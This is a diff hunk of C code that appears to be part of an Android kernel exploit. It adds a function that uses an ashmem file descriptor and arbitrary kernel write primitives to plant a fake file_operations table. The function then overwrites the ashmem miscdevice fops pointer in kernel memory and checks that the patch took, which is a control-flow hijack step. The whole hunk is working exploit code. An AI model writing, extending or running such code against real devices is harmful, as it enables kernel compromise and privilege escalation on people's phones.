@@ -571,6 +571,48 @@ void put_fake_fops_table(unsigned char *p, size_t off) {
   put64(p, off + FOPS_SPLICE_READ_OFF, text_addr(COPY_SPLICE_READ));
   put64(p, off + FOPS_SHOW_FDINFO_OFF, text_addr(ASHMEM_SHOW_FDINFO));
 }
+int direct_fops_overwrite(int ashmem_fd) {
+  if (!page_base) {
+    pr_error("direct fops overwrite: page_base is zero\n");
+    return 0;
+  }
+
+  /* 1. Write fake fops table directly to the prepared page.
+     prepare_skb_payload() already laid out fake waiter/task structures
+     on this page; we just need to write the fops table bytes. */
+  unsigned char fops_buf[0x110];
+  memset(fops_buf, 0, sizeof(fops_buf));
+  put_fake_fops_table(fops_buf, 0);
+
+  if (kernel_write_data(ashmem_fd, page_base + FOPS_TABLE_OFF,
+                        fops_buf, sizeof(fops_buf)) != (ssize_t)sizeof(fops_buf)) {
+    pr_error("direct fops overwrite: failed to write fake fops table\n");
+    return 0;
+  }
+
+  /* 2. Patch ashmem_misc->fops to point to our fake table.
+     ASHMEM_MISC_FOPS is the pointer field inside struct miscdevice. */
+  uint64_t fake_fops_ptr = page_base + FOPS_TABLE_OFF;
+  uintptr_t misc_fops_addr = text_addr(ASHMEM_MISC_FOPS_OFF);
+
+  if (kernel_write_data(ashmem_fd, misc_fops_addr,
+                        &fake_fops_ptr, sizeof(fake_fops_ptr)) != (ssize_t)sizeof(fake_fops_ptr)) {
+    pr_error("direct fops overwrite: failed to patch miscdevice fops pointer\n");
+    return 0;
+  }
+
+  /* 3. Verify the patch took. */
+  uint64_t verify = kernel_read64(ashmem_fd, misc_fops_addr);
+  if (verify != fake_fops_ptr) {
+    pr_error("direct fops overwrite: verify failed read=%016llx expected=%016zx\n",
+             (unsigned long long)verify, fake_fops_ptr);
+    return 0;
+  }
+
+  pr_success("direct fops overwrite: patched misc_fops=%016zx -> %016llx\n",
+             misc_fops_addr, (unsigned long long)fake_fops_ptr);
+  return 1;
+}
 
 int try_put_blob_no_zeros(int fd, const unsigned char *blob, size_t len) {
   char name[ASHMEM_NAME_LEN];
